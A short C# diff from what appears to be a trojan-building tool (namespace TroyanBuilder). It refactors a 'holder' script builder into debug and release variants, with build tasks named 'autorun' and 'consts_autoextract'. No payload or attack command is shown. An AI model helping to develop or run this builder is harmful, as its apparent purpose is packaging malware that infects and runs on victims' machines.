@@ -3,12 +3,10 @@ using System.Text.Json.Nodes;
 
 namespace TroyanBuilder;
 
-public class HolderBuilder: CustomBuilder
+public abstract class HolderBuilder: CustomBuilder
 {
     protected override string SourceDir => Path.Combine(Model.TroyanScriptDir, "holder");
     protected override string OutputFile => Model.Holder;
-    protected override string OutputReleaseFile => Model.HolderRelease;
-    protected override string OutputDebugFile => Model.HolderDebug;
 
     protected override string[] PrioritySources => new [] {"consts_body", "consts_autoextract", "utils"};
     protected override string[] PriorityTasks => new [] { "autorun" };
@@ -41,4 +39,14 @@ $xbody = ""__BODY""
         return result;
     }
 
+}
+
+public class HolderBuilderDebug : BodyBuilder
+{
+    protected override string OutputFile => Model.HolderDebug;
+}
+
+public class HolderBuilderRelease : BodyBuilder
+{
+    protected override string OutputFile => Model.HolderRelease;
 }
